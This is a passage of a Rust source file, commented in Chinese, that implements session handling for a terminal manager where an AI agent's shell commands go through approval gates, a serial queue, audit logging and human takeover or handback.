//! 会话句柄：控制权状态机、exec 串行队列与执行管线、审批联动、尽力停止。
//! 作废契约（L1 §3.1 v0.5）：接管生效时，交接前未开始的全部请求作废
//! （待审批 / 已批准待执行 / 排队传输），阻塞调用返回 VoidedByHandback{brief}。

use crate::ApprovalCenter;
use session_api::transport::tokio_util_sync::CancellationToken;
use session_api::transport::{ChannelHandle, TransportSignal};
use session_api::*;
use std::collections::{HashMap, HashSet};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::{Duration, Instant};
use term_core::Screen;
use tokio::sync::{broadcast, Mutex as AsyncMutex, oneshot};

/// 重确认白名单（L1 §3.1：内置只读核实命令，Agent 不可自选）。
pub const RECONFIRM_WHITELIST: &[&str] = &["pwd", "printenv", "which", "ps", "systemctl status"];

/// R35 §366 并行传输上限：每会话默认 2、窗口全局 4（其余排队保持 Queued）。
pub const TRANSFER_PER_SESSION: usize = 2;
pub const TRANSFER_GLOBAL: usize = 4;

pub fn is_whitelisted(cmd: &str) -> bool {
    let t = cmd.trim();
    // 仅限单条简单命令：复合（; && || | &）、替换（$(` )、重定向（><）、换行
    // 一律退出白名单——防 `pwd && <任意命令>` 借前缀绕过审批与重确认门槛。
    const UNSAFE_CHARS: &[char] = &[';', '&', '|', '`', '\n', '>', '<'];
    if t.contains(UNSAFE_CHARS) || t.contains("$(") {
        return false;
    }
    RECONFIRM_WHITELIST
        .iter()
        .any(|w| t == *w || t.starts_with(&format!("{w} ")))
}

/// 决策消息（Decision 之外还有作废路径）。
pub enum DecisionMsg {
    Decide(Decision),
    Voided,
}

#[derive(Debug, Clone)]
pub struct RunningExec {
    pub mode: ExecMode,
    pub cancel: CancellationToken,
    pub started: Instant,
}

pub struct SessionHandle {
    pub id: SessionId,
    pub host: Host,
    pub kind: String, // "local" | "ssh"
    /// R41（§6.6/S09）会话**真实创建时刻**（构造期一次写入，之后不变）。
    /// 此前 `list_sessions` 填的是查询时刻（每次轮询都变）——详情里的「创建时间」
    /// 因此是假值；R41 改为构造期快照。
    pub created_at: chrono::DateTime<chrono::Utc>,
    pub channel: Arc<dyn ChannelHandle>,
    pub screen: AsyncMutex<Screen>,
    pub output_tx: broadcast::Sender<OutputEvent>,

    // 控制权（短临界区）
    pub owner: AsyncMutex<ControlOwner>,
    pub state: AsyncMutex<SessionState>,
    pub generation: AtomicU64,
    pub transitions: AsyncMutex<Vec<(chrono::DateTime<chrono::Utc>, String)>>,
    pub last_human_input: AsyncMutex<Option<Instant>>,
    pub verification_hits: AtomicU64,

    // C3（R24）：shell 集成态（Disabled/Pending/Ready/Unavailable；SessionInfo 派生源）
    pub integration: StdMutex<session_api::IntegrationState>,
    /// R26（§6.4）：自动重连停止旗标——stop_auto_reconnect 置位后重试循环在
    /// 下一检查点（≤250ms）落 Disconnected；新断线周期/手动重连入口复位。
    pub retry_stop: AtomicBool,
    // exec 串行队列
    pub exec_slot: AsyncMutex<()>,
    pub queue_waiters: AtomicUsize,
    /// 排队（未开始）exec —— 接管时全部作废并列出。
    pub pending: StdMutex<Vec<ExecId>>,

    /// 每个未完成 exec 的取消令牌。
    pub live_execs: StdMutex<HashMap<ExecId, CancellationToken>>,
    /// 运行中（已开始执行）——尽力停止的对象。
    pub running: StdMutex<HashMap<ExecId, RunningExec>>,
    /// 排队传输。
    pub transfers: StdMutex<HashMap<TransferId, CancellationToken>>,
    /// R35 §366 每会话并行传输闸（默认 2；排队者保持 Queued，先于同目标锁获取）。
    pub xfer_gate_session: Arc<tokio::sync::Semaphore>,
    /// send_keys 会话级授权（接管即失效）。
    pub send_keys_auth: StdMutex<HashSet<String>>,

    /// 任务目标/交接留言（R9：人类写给 Agent；随会话存亡，经 SessionBrief.goal 暴露）。
    pub goal: StdMutex<Option<String>>,

    /// R42（§6.7）：该会话是否曾被 Agent 持有控制权。构造期按 owner 定初值，
    /// `handback` 置真。UI 据此把「首次委托」与「曾被接管后交还」的入口措辞分开。
    pub ever_agent_owned: AtomicBool,

    // ---- C10 输出订阅（R11）----
    /// 字节事件序号（每 session 单调递增；仅在 pump 持 screen 锁的临界区内推进，
    /// 与屏幕状态线性化一致）。
    pub output_seq: AtomicU64,
    /// 最近一次检查点捕获时的 seq（resync「检查点更近」判定用）。
    pub last_ckpt_seq: AtomicU64,
    /// 原始字节重放环（(seq, bytes)，淘汰制；resync 无损重放窗口）。
    pub replay: StdMutex<ReplayRing>,
    /// 活跃订阅身份 → 取消信号（subscribe 注册 / unsubscribe 移除并触发桥 task 退出）。
    pub subs: StdMutex<HashMap<String, tokio::sync::watch::Sender<bool>>>,

    pub center: Arc<ApprovalCenter>,
}

/// 重放环容量：8 MiB 或 8192 帧，先到先淘汰（前端 pending 溢出会走 resync）。
pub const REPLAY_CAP_BYTES: usize = 8 * 1024 * 1024;
pub const REPLAY_CAP_FRAMES: usize = 8192;

#[derive(Default)]
pub struct ReplayRing {
    pub q: std::collections::VecDeque<(u64, Vec<u8>)>,
    pub bytes: usize,
}

impl ReplayRing {
    pub fn push(&mut self, seq: u64, data: Vec<u8>) {
        self.bytes += data.len();
        self.q.push_back((seq, data));
        while self.bytes > REPLAY_CAP_BYTES || self.q.len() > REPLAY_CAP_FRAMES {
            match self.q.pop_front() {
                Some((_, d)) => self.bytes -= d.len(),
                None => break,
            }
        }
    }

    /// (from, ∞) 区间内连续重放的起点是否仍被覆盖（首帧 seq <= from+1）。
    pub fn covers_from(&self, from: u64) -> bool {
        match self.q.front() {
            Some(&(s, _)) => s <= from + 1,
            None => false,
        }
    }
}

impl SessionHandle {
    pub fn new(
        id: SessionId,
        host: Host,
        kind: String,
        channel: Arc<dyn ChannelHandle>,
        screen: Screen,
        center: Arc<ApprovalCenter>,
        owner: ControlOwner,
    ) -> Arc<Self> {
        let (output_tx, _) = broadcast::channel(4096);
        // 转发状态事件桥（T44 真机冒烟补口）：transport 写口回调 → Changed 广播。
        // UI 事件驱动刷新转发面板；盲轮询兜底保留（timer 节流场景见 ForwardEvent 注释）
        {
            let tx = center.forwards_tx.clone();
            let sid = id.clone();
            channel.set_forward_event_cb(Arc::new(move |_fid| {
                let _ = tx.send(session_api::ForwardEvent::Changed { session_id: sid.clone() });
            }));
        }
        Arc::new(Self {
            id,
            host,
            kind,
            created_at: chrono::Utc::now(),
            channel,
            screen: AsyncMutex::new(screen),
            output_tx,
            // C2（B01）：构造期定 owner——无「建完再接管」窗口
            owner: AsyncMutex::new(owner),
            state: AsyncMutex::new(SessionState::Connected),
            generation: AtomicU64::new(0),
            transitions: AsyncMutex::new(Vec::new()),
            last_human_input: AsyncMutex::new(None),
            verification_hits: AtomicU64::new(0),
            exec_slot: AsyncMutex::new(()),
            queue_waiters: AtomicUsize::new(0),
            pending: StdMutex::new(Vec::new()),
            live_execs: StdMutex::new(HashMap::new()),
            running: StdMutex::new(HashMap::new()),
            transfers: StdMutex::new(HashMap::new()),
            xfer_gate_session: Arc::new(tokio::sync::Semaphore::new(TRANSFER_PER_SESSION)),
            send_keys_auth: StdMutex::new(HashSet::new()),
            goal: StdMutex::new(None),
            ever_agent_owned: AtomicBool::new(matches!(owner, ControlOwner::Agent)),
            output_seq: AtomicU64::new(0),
            last_ckpt_seq: AtomicU64::new(0),
            replay: StdMutex::new(ReplayRing::default()),
            subs: StdMutex::new(HashMap::new()),
            integration: StdMutex::new(session_api::IntegrationState::Disabled),
            retry_stop: AtomicBool::new(false),
            center,
        })
    }

    async fn gen_brief(&self) -> Box<SessionBrief> {
        Box::new(crate::brief::compute(self).await)
    }

    pub(crate) async fn note_transition(&self, what: &str) {
        self.transitions
            .lock()
            .await
            .push((chrono::Utc::now(), what.to_string()));
    }

    /// C10 线性化点：屏幕 feed、seq 推进、重放入环在同一临界区——
    /// 检查点/重放水位与屏幕状态一致（「不能截到已推进 seq、尚未应用到屏幕」）。
    /// pump 与测试共用，保证只有一条写入路径。
    pub async fn feed_output(&self, data: &[u8]) -> u64 {
        self.feed_output_fn(|s| {
            s.feed(data);
            data.to_vec()
        })
        .await
    }

    /// 线性化点的闭包变体：闭包在持 screen 锁时产出实际写入屏幕的字节
    /// （如 replay_fresh 的组装+应用），返回值作为该 seq 的事件入环并广播。
    /// 除测试外，一切屏幕写入都应经此或 feed_output。
    pub async fn feed_output_fn(&self, produce: impl FnOnce(&mut Screen) -> Vec<u8>) -> u64 {
        let mut s = self.screen.lock().await;
        let data = produce(&mut s);
        let seq = self.output_seq.fetch_add(1, std::sync::atomic::Ordering::AcqRel) + 1;
        self.replay.lock().unwrap().push(seq, data.clone());
        drop(s);
        let _ = self
            .output_tx
            .send(OutputEvent::Raw { sid: self.id.clone(), seq, data });
        seq
    }

    /// Shell 模式执行（现场延续；边界 = OSC 133 命令块）。
    async fn run_shell(
        &self,
        actor: &Actor,
        exec_id: &ExecId,
        cmd: &str,
        opts: &ExecOpts,
        deadline: std::time::Instant,
        cancel: CancellationToken,
        trace: ApprovalTrace,
        started: Instant,
    ) -> Result<ExecResult> {
        // C3（R24）：无集成 → 副作用前拒绝 Shell 模式（禁止自动 Fresh 降级——DC3.1/契约
        // 「语义（执行前拒绝，替代静默降级）」；显式 Fresh 由调用方另行授权）。
        // DC3.3：入口重查能力，不信任缓存。
        let (integrated, prompt_ready) = {
            let s = self.screen.lock().await;
            (s.shell_integration_present(), s.prompt_ready())
        };
        if !integrated {
            // local 会话：PTY 启动时无条件注入（transport-pty rcfile/ZDOTDIR），集成由
            // 构造保证——此处是 shell 启动竞态而非「不可用」，有界等待 OSC133（与注入
            // 后台化一致，不回退 Fresh）。超时仍无 = 环境异常，如实拒绝。
            if self.kind != "local" {
                return Err(Error::ShellIntegrationUnavailable {
                    available: session_api::ShellCapability {
                        integration_present: false,
                        prompt_ready,
                        host_setting: self.host.shell_integration == Some(true),
                    },
                });
            }
            let wait_deadline = Instant::now() + Duration::from_secs(10);
            loop {
                {
                    let s = self.screen.lock().await;
                    if s.shell_integration_present() {
                        break;
                    }
                }
                if Instant::now() >= wait_deadline {
                    return Err(Error::ShellIntegrationUnavailable {
                        available: session_api::ShellCapability {
                            integration_present: false,
                            prompt_ready,
                            host_setting: false,
                        },
                    });
                }
                if cancel.is_cancelled() {
                    return Err(Error::Cancelled);
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
        }

        // 等待块空闲（人类正在交互程序中时不得写入）
        let idle_deadline = Instant::now() + Duration::from_secs(5);
        loop {
            {
                let s = self.screen.lock().await;
                if !s.blocks.has_open_block() {
                    break;
                }
            }
            if Instant::now() >= idle_deadline {
                return Err(Error::ExecTimeout);
            }
            if cancel.is_cancelled() {
                return Err(Error::Cancelled);
            }
            tokio::time::sleep(Duration::from_millis(30)).await;
        }

        // 登记：键入归因 + 捕获 + 受管 exec_id。
        // 登记用原 UTF-8（屏态吃的是泵侧解码后的回显），写线上的才是编码字节（GBK）。
        let mut text = cmd.trim_end().to_string();
        text.push('\r');
        {
            let mut s = self.screen.lock().await;
            s.arm_capture(exec_id);
            s.register_outgoing(text.as_bytes(), source_of(actor));
        }
        self.channel.write(&crate::charset::encode(self.host.charset, &text)).await?;

        self.running
            .lock()
            .unwrap()
            .insert(exec_id.clone(), RunningExec {
                mode: ExecMode::Shell,
                cancel: cancel.clone(),
                started,
            });

        // 等待块收尾（捕获完成通知）
        let mut cap_rx = {
            let s = self.screen.lock().await;
            s.subscribe_capture()
        };
        tokio::select! {
            r = async {
                loop {
                    match cap_rx.recv().await {
                        Ok(id) if id == *exec_id => return Ok::<(), Error>(()),
                        Ok(_) => continue,
                        Err(broadcast::error::RecvError::Lagged(_)) => continue,
                        Err(broadcast::error::RecvError::Closed) => return Err(Error::SessionClosed),
                    }
                }
            } => { r?; }
            _ = tokio::time::sleep_until(tokio::time::Instant::from_std(deadline)) => {
                return Err(Error::ExecTimeout); // 命令继续在远端跑（人类可见），不谎报已停
            }
            _ = cancel.cancelled() => return Err(Error::Cancelled),
        }

        let (raw_out, exit_code) = {
            let mut s = self.screen.lock().await;
            let raw = s.take_capture(exec_id).unwrap_or_default();
            let exit = s.blocks.last_blocks(1).last().and_then(|b| {
                if b.exec_id.as_deref() == Some(exec_id.as_str()) {
                    b.exit_code
                } else {
                    None
                }
            });
            (raw, exit)
        };
        self.running.lock().unwrap().remove(exec_id);
        self.live_execs.lock().unwrap().remove(exec_id);

        let cap = opts.output_cap.unwrap_or(DEFAULT_OUTPUT_CAP);
        let mut text = term_core::strip_ansi(&raw_out);
        // bash 将 PS0/PS1 的 \[ \]（readline 忽略标记）展开为 \x01/\x02 随输出发出，
        // 对 MCP/UI 消费者是纯噪音（简报与命令框已各自清洗，此处统一收口）
        if text.contains(['\x01', '\x02']) {
            text = text.replace(['\x01', '\x02'], "");
        }
        let truncated = text.len() > cap;
        let text = if truncated { text[..cap].to_string() } else { text };
        let (has_binary, text) = sanitize_utf8(&text);

        Ok(ExecResult {
            exec_id: exec_id.clone(),
            exit_code,
            stdout: text,
            stderr: String::new(), // PTY 合并流：stderr 与 stdout 同源（L1 §3.1 如实标注）
            has_binary,
            truncated,
            duration: started.elapsed(),
            approval: trace,
        })
    }

    /// Fresh 模式执行（独立通道；真实退出码；镜像回放）。
    async fn run_fresh(
        &self,
        actor: &Actor,
        exec_id: &ExecId,
        cmd: &str,
        opts: &ExecOpts,
        deadline: std::time::Instant,
        cancel: CancellationToken,
        trace: ApprovalTrace,
        started: Instant,
    ) -> Result<ExecResult> {
        self.running
            .lock()
            .unwrap()
            .insert(exec_id.clone(), RunningExec {
                mode: ExecMode::Fresh,
                cancel: cancel.clone(),
                started,
            });
        let outcome = self.channel.exec_fresh(cmd, opts, deadline, &cancel).await;
        self.running.lock().unwrap().remove(exec_id);
        self.live_execs.lock().unwrap().remove(exec_id);
        let outcome = outcome?;

        // 镜像回放桥：Fresh 结果写回屏幕，带 Agent 标注（L1 §3.1 不可省略）。
        // 经线性化点：回放字节与传输字节同一 seq/重放环/订阅广播机制（rev-r11 发现 1 修复）
        {
            let client = match actor {
                Actor::Agent { client_id } => Some(client_id.clone()),
                _ => None,
            };
            let stdout = String::from_utf8_lossy(&outcome.stdout).into_owned();
            let stderr = String::from_utf8_lossy(&outcome.stderr).into_owned();
            let exit = outcome.exit_code.unwrap_or(-1);
            self.feed_output_fn(|s| {
                s.replay_fresh(cmd, client.as_deref(), &stdout, &stderr, exit, exec_id)
            })
            .await;
        }

        if cancel.is_cancelled() {
            return Err(Error::Cancelled);
        }
        if !outcome.completed {
            return Err(Error::ExecTimeout);
        }

        let cap = opts.output_cap.unwrap_or(DEFAULT_OUTPUT_CAP);
        let conv = |bytes: &[u8]| -> (bool, String, bool) {
            let text = String::from_utf8_lossy(bytes).into_owned();
            let truncated = text.len() > cap;
            let text = if truncated { text[..cap].to_string() } else { text };
            let (has_binary, text) = sanitize_utf8(&text);
            (has_binary, text, truncated)
        };
        let (so_bin, so, so_trunc) = conv(&outcome.stdout);
        let (se_bin, se, se_trunc) = conv(&outcome.stderr);

        Ok(ExecResult {
            exec_id: exec_id.clone(),
            exit_code: outcome.exit_code,
            stdout: so,
            stderr: se,
            has_binary: so_bin || se_bin,
            truncated: so_trunc || se_trunc,
            duration: started.elapsed(),
            approval: trace,
        })
    }

    /// exec 管线（SessionApi::exec 的实现体）。
    pub async fn exec(
        self: &Arc<Self>,
        actor: &Actor,
        cmd: &str,
        opts: ExecOpts,
    ) -> Result<ExecResult> {
        if cmd.trim().is_empty() {
            return Err(Error::InvalidInput("empty command".into()));
        }
        // 1) 控制权与重确认检查（人类是主权者，永不被拦；限制只作用于 Agent）
        let reconfirm_verify = {
            let owner = *self.owner.lock().await;
            let state = *self.state.lock().await;
            if owner == ControlOwner::Human && !actor.is_human() {
                return Err(Error::ControlTakenByHuman);
            }
            if state == SessionState::Reconfirming && !actor.is_human() && !is_whitelisted(cmd) {
                return Err(Error::ReconfirmingPending);
            }
            state == SessionState::Reconfirming && is_whitelisted(cmd)
        };

        let exec_id = format!("e-{}", uuid::Uuid::new_v4());
        let cancel = CancellationToken::new();
        self.live_execs
            .lock()
            .unwrap()
            .insert(exec_id.clone(), cancel.clone());

        // 2) 串行队列（背压：超上限立即 QueueBusy）
        let pos = self.queue_waiters.fetch_add(1, Ordering::SeqCst) + 1;
        if pos > MAX_EXEC_QUEUE {
            self.queue_waiters.fetch_sub(1, Ordering::SeqCst);
            self.live_execs.lock().unwrap().remove(&exec_id);
            return Err(Error::QueueBusy { position: pos as u32 });
        }
        self.pending.lock().unwrap().push(exec_id.clone());
        let gen_at_entry = self.generation.load(Ordering::SeqCst);
        let _slot = self.exec_slot.lock().await;
        self.queue_waiters.fetch_sub(1, Ordering::SeqCst);
        self.pending.lock().unwrap().retain(|e| e != &exec_id);
        if self.generation.load(Ordering::SeqCst) != gen_at_entry {
            self.live_execs.lock().unwrap().remove(&exec_id);
            return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
        }
        let _cancel_guard = CancelOnDrop(exec_id.clone(), cancel.clone(), &self.live_execs);

        // 3) 审批门（ADR-5：核心层强制；人类短路）
        let started = Instant::now();
        let mut effective_cmd = cmd.to_string();
        let mut edited_cmd: Option<String> = None;
        let trace = match actor {
            Actor::Human => ApprovalTrace {
                approval_id: None,
                outcome: ApprovalOutcome::HumanActor,
            },
            Actor::Agent { client_id } => {
                // 重确认白名单：内置只读核实命令，不进审批（核心自动判定完成）
                if reconfirm_verify {
                    ApprovalTrace { approval_id: None, outcome: ApprovalOutcome::Auto }
                } else {
                let eval = self.center.engine.evaluate(client_id, &effective_cmd);
                match eval.verdict {
                    tinyssh_approval::SegmentVerdict::Dangerous => {
                        self.center.audit.append(
                            actor,
                            "exec_denied",
                            Some(&self.id),
                            Some(&effective_cmd),
                            serde_json::json!({"reason": "dangerous_pattern"}),
                            None,
                        )?;
                        return Err(Error::ApprovalDenied { reason: DeniedReason::DangerousPattern });
                    }
                    tinyssh_approval::SegmentVerdict::AutoAllow => ApprovalTrace {
                        approval_id: None,
                        outcome: ApprovalOutcome::Auto,
                    },
                    tinyssh_approval::SegmentVerdict::NeedsApproval => {
                        let (t, edited) = self
                            .wait_approval(
                                actor, client_id, &exec_id, &effective_cmd, &eval, true,
                                opts.mode == ExecMode::Fresh, cancel.clone(),
                            )
                            .await?;
                        edited_cmd = edited;
                        t
                    }
                }
                }
            }
        };
        if let Some(c) = edited_cmd {
            effective_cmd = c;
        }

        // 4) 开始前再查作废（已批准未开始 → 同样作废）
        if self.generation.load(Ordering::SeqCst) != gen_at_entry {
            return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
        }
        if cancel.is_cancelled() {
            return Err(Error::Cancelled);
        }

        // 5) 执行
        let timeout_d = opts.timeout.unwrap_or(DEFAULT_EXEC_TIMEOUT);
        let deadline = Instant::now() + timeout_d;
        let result = match opts.mode {
            ExecMode::Shell => {
                self.run_shell(actor, &exec_id, &effective_cmd, &opts, deadline, cancel.clone(), trace.clone(), started)
                    .await
            }
            ExecMode::Fresh => {
                self.run_fresh(actor, &exec_id, &effective_cmd, &opts, deadline, cancel.clone(), trace.clone(), started)
                    .await
            }
        };

        // 6) 重确认推进：白名单核实完成 → 退出 Reconfirming（核心自动判定）
        if let Ok(r) = &result {
            let state = *self.state.lock().await;
            if state == SessionState::Reconfirming && is_whitelisted(&effective_cmd) {
                let hits = self.verification_hits.fetch_add(1, Ordering::SeqCst) + 1;
                if hits >= 1 {
                    *self.state.lock().await = SessionState::Connected;
                    self.note_transition("重确认完成：核实事实恢复 Confirmed").await;
                }
            }
            let _ = r;
        }

        // 7) 审计
        let audit_payload = match &result {
            Ok(r) => serde_json::json!({
                "exit_code": r.exit_code, "duration_ms": r.duration.as_millis() as u64,
                "truncated": r.truncated, "mode": format!("{:?}", opts.mode),
            }),
            Err(e) => serde_json::json!({"error": e.to_string()}),
        };
        let _ = self.center.audit.append(
            actor,
            "exec",
            Some(&self.id),
            Some(&effective_cmd),
            audit_payload,
            trace.approval_id.as_deref(),
        );

        result
    }

    /// 创建并等待审批决策（120s 超时 → ApprovalTimeout；接管 → Voided）。
    /// `editable`：该卡是否支持编辑后批准（exec true；转发/传输 false——
    /// 参数无法从编辑文本回解，T44 复核中-2）。`fresh`：Fresh 模式卡标注
    /// 「不继承当前终端目录/环境」（C3 契约）。
    pub async fn wait_approval(
        &self,
        actor: &Actor,
        client_id: &AgentClientId,
        exec_id: &ExecId,
        cmd: &str,
        eval: &tinyssh_approval::Evaluation,
        editable: bool,
        fresh: bool,
        cancel: CancellationToken,
    ) -> Result<(ApprovalTrace, Option<String>)> {
        let mut summary = target_summary(cmd);
        if fresh {
            summary.push_str("【Fresh：不继承当前终端目录/环境】");
        }
        let item = ApprovalItem {
            id: format!("a-{}", uuid::Uuid::new_v4()),
            session_id: self.id.clone(),
            agent_id: client_id.clone(),
            command: cmd.to_string(),
            edited_command: None,
            target_summary: summary,
            segment_report: eval.segments.clone(),
            session_busy: self.screen.lock().await.blocks.has_open_block(),
            editable,
            created_at: chrono::Utc::now(),
            status: ApprovalStatus::Pending,
            attempt_id: None,
            // R42（§6.7）：请求发起时的「可用目的」快照（读取路径会再按当前目标投影刷新）。
            purpose: self.goal.lock().unwrap().clone(),
        };
        let gen_at_entry = self.generation.load(Ordering::SeqCst);
        let (tx, rx) = oneshot::channel();
        {
            let mut decisions = self.center.decisions.lock().unwrap();
            decisions.insert(item.id.clone(), tx);
        }
        self.center.items.lock().unwrap().insert(item.id.clone(), item.clone());
        if let Err(e) = self.center.vault.save_approval(&item) {
            tracing::warn!("save approval: {e}");
        }
        let _ = self.center.approvals_tx.send(ApprovalEvent::New(item.clone()));
        let _ = self
            .center
            .audit
            .append(actor, "approval_requested", Some(&self.id), Some(cmd), serde_json::json!({"segments": eval.segments}), Some(&item.id));

        // 卡片登记与代际捕获之间发生接管 → 登记后复查一次，即时作废返回
        // （否则该请求会空等到 120s 超时而非立即 VoidedByHandback）
        if self.generation.load(Ordering::SeqCst) != gen_at_entry {
            self.mark_status(&item.id, ApprovalStatus::Voided);
            let voided_item = self.center.items.lock().unwrap().get(&item.id).cloned();
            if let Some(mut it) = voided_item {
                it.status = ApprovalStatus::Voided;
                let _ = self.center.vault.save_approval(&it);
                let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
            }
            return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
        }
        let decision: DecisionMsg = tokio::select! {
            r = rx => match r {
                Ok(msg) => msg,
                Err(_) => return Err(Error::Storage("decision channel dropped".into())),
            },
            _ = tokio::time::sleep(DEFAULT_APPROVAL_TIMEOUT) => {
                self.mark_status(&item.id, ApprovalStatus::Timeout);
                return Err(Error::ApprovalDenied { reason: DeniedReason::ApprovalTimeout });
            }
            _ = cancel.cancelled() => return Err(Error::Cancelled),
            // 接管发生 → 本请求作废（含待审批卡片）
            _ = async {
                loop {
                    if self.generation.load(Ordering::SeqCst) != gen_at_entry { break; }
                    tokio::time::sleep(Duration::from_millis(20)).await;
                }
            } => {
                self.mark_status(&item.id, ApprovalStatus::Voided);
                let voided_item = self.center.items.lock().unwrap().get(&item.id).cloned();
                if let Some(mut it) = voided_item {
                    it.status = ApprovalStatus::Voided;
                    let _ = self.center.vault.save_approval(&it);
                    let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
                }
                return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
            }
        };

        match decision {
            DecisionMsg::Decide(Decision::Approve) => {
                self.mark_status(&item.id, ApprovalStatus::Approved);
                Ok((
                    ApprovalTrace { approval_id: Some(item.id), outcome: ApprovalOutcome::Approved },
                    None,
                ))
            }
            DecisionMsg::Decide(Decision::ApproveEdited(c)) => {
                if !self.center.engine.is_editable_decision(client_id, &c) {
                    self.mark_status(&item.id, ApprovalStatus::Denied);
                    return Err(Error::ApprovalDenied { reason: DeniedReason::DangerousPattern });
                }
                self.mark_edited(&item.id, &c);
                Ok((
                    ApprovalTrace { approval_id: Some(item.id), outcome: ApprovalOutcome::ApprovedEdited },
                    Some(c),
                ))
            }
            DecisionMsg::Decide(Decision::Deny) => {
                self.mark_status(&item.id, ApprovalStatus::Denied);
                let _ = self.center.audit.append(
                    actor, "approval_denied", Some(&self.id), Some(cmd), serde_json::json!({}), Some(&item.id));
                return Err(Error::ApprovalDenied { reason: DeniedReason::Denied });
            }
            DecisionMsg::Voided => {
                self.mark_status(&item.id, ApprovalStatus::Voided);
                return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
            }
        }
    }

    fn mark_status(&self, id: &str, status: ApprovalStatus) {
        let mut items = self.center.items.lock().unwrap();
        if let Some(it) = items.get_mut(id) {
            it.status = status;
        }
    }

    fn mark_edited(&self, id: &str, edited: &str) {
        let mut items = self.center.items.lock().unwrap();
        if let Some(it) = items.get_mut(id) {
            it.status = ApprovalStatus::ApprovedEdited;
            it.edited_command = Some(edited.to_string());
        }
    }

    /// 尽力停止：SIGINT→SIGQUIT 升级（Shell）；通道取消（Fresh）。逐条真实结果。
    async fn stop_one(&self, exec_id: &ExecId, running: &RunningExec) -> (ExecId, StopOutcome) {
        match running.mode {
            ExecMode::Shell => {
                let _ = self.channel.signal(TransportSignal::Interrupt).await;
                if self.wait_exec_exit(exec_id, Duration::from_secs(2)).await {
                    let code = self
                        .screen
                        .lock()
                        .await
                        .blocks
                        .last_blocks(1)
                        .last()
                        .and_then(|b| b.exit_code)
                        .unwrap_or(0);
                    return (exec_id.clone(), StopOutcome::Exited(code));
                }
                let _ = self.channel.signal(TransportSignal::Quit).await;
                if self.wait_exec_exit(exec_id, Duration::from_secs(2)).await {
                    return (exec_id.clone(), StopOutcome::Escalated);
                }
                (exec_id.clone(), StopOutcome::Unresponsive)
            }
            ExecMode::Fresh => {
                running.cancel.cancel();
                (exec_id.clone(), StopOutcome::Escalated)
            }
        }
    }

    async fn wait_exec_exit(&self, exec_id: &str, wait: Duration) -> bool {
        let deadline = Instant::now() + wait;
        loop {
            if !self.running.lock().unwrap().contains_key(exec_id) {
                return true; // 已从 running 移除 = 已退出
            }
            if Instant::now() >= deadline {
                return false;
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    }

    /// 接管契约（PRD FR-6 v0.5）。
    pub async fn takeover(self: &Arc<Self>, opts: ControlOpts) -> Result<TakeoverReport> {
        let mut owner = self.owner.lock().await;
        if *owner == ControlOwner::Human {
            drop(owner);
            // 幂等：重复接管直接返回当前状态
            return Ok(TakeoverReport {
                frozen: true,
                paused_queue: Vec::new(),
                stopped: Vec::new(),
                brief: *self.gen_brief().await,
            });
        }
        // 1) 冻结：控制权原子切换 + 代际 +1（所有交接前未开始请求作废）
        *owner = ControlOwner::Human;
        drop(owner);
        self.generation.fetch_add(1, Ordering::SeqCst);
        self.note_transition("人类接管（交接前未开始的请求全部作废）").await;

        // 2) 作废待审批卡片（不可再生效）
        let voided_ids: Vec<ApprovalId> = {
            let items = self.center.items.lock().unwrap();
            items
                .iter()
                .filter(|(_, it)| it.session_id == self.id && it.status == ApprovalStatus::Pending)
                .map(|(id, _)| id.clone())
                .collect()
        };
        for id in &voided_ids {
            self.mark_status(id, ApprovalStatus::Voided);
            let it = self.center.items.lock().unwrap().get(id).cloned();
            if let Some(mut it) = it {
                it.status = ApprovalStatus::Voided;
                let _ = self.center.vault.save_approval(&it);
                // 作废留痕（五人走查·老周，与 close_session 同口径）：接管作废的卡
                // 也要能事后核对「作废了什么」。takeover 仅人类可入（set_control
                // 前置校验），此处 actor 固定 Human。
                let _ = self.center.audit.append(
                    &Actor::Human, "approval_voided", Some(&self.id), Some(&it.command),
                    serde_json::json!({"reason": "takeover", "agent": it.agent_id}),
                    Some(id));
                let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
            }
        }

        // 3) 排队（未开始）exec 作废并列出
        let paused_queue: Vec<ExecId> = std::mem::take(&mut *self.pending.lock().unwrap());
        for id in &paused_queue {
            if let Some(c) = self.live_execs.lock().unwrap().get(id) {
                c.cancel();
            }
        }
        // 4) 排队传输作废
        {
            let mut transfers = self.transfers.lock().unwrap();
            for (_, t) in transfers.iter_mut() {
                t.cancel();
            }
        }
        // 5) send_keys 会话级授权失效（expires: 接管）
        self.send_keys_auth.lock().unwrap().clear();

        // 6) 尽力停止运行中任务（显式选项）
        let mut stopped = Vec::new();
        if opts.stop_running == StopPolicy::BestEffort {
            let running: Vec<(ExecId, RunningExec)> = self
                .running
                .lock()
                .unwrap()
                .iter()
                .map(|(k, v)| (k.clone(), RunningExec { mode: v.mode, cancel: v.cancel.clone(), started: v.started }))
                .collect();
            for (id, r) in &running {
                let outcome = self.stop_one(id, r).await;
                stopped.push(outcome);
            }
        }

        let brief = self.gen_brief().await;
        let _ = self.center.audit.append(
            &Actor::Human,
            "takeover",
            Some(&self.id),
            None,
            serde_json::json!({"voided_approvals": voided_ids, "paused_queue": paused_queue, "stopped": stopped.iter().map(|(e, o)| (e, format!("{o:?}"))).collect::<Vec<_>>()}),
            None,
        );
        Ok(TakeoverReport { frozen: true, paused_queue, stopped, brief: *brief })
    }

    /// 交还契约：恢复 Agent 控制权；旧请求不自动执行（已在接管时作废）。
    pub async fn handback(self: &Arc<Self>) -> Result<TakeoverReport> {
        {
            let mut owner = self.owner.lock().await;
            if *owner == ControlOwner::Agent {
                return Err(Error::InvalidInput("control already owned by agent".into()));
            }
            *owner = ControlOwner::Agent;
        }
        // R42（§6.7）：控制权一旦到过 Agent，此后 Human-owned 的入口措辞即「交还 Agent」。
        self.ever_agent_owned.store(true, Ordering::SeqCst);
        self.note_transition("人类交还（Agent 先读简报，再重新决定动作）").await;
        let brief = self.gen_brief().await;
        let _ = self.center.audit.append(&Actor::Human, "handback", Some(&self.id), None, serde_json::json!({}), None);
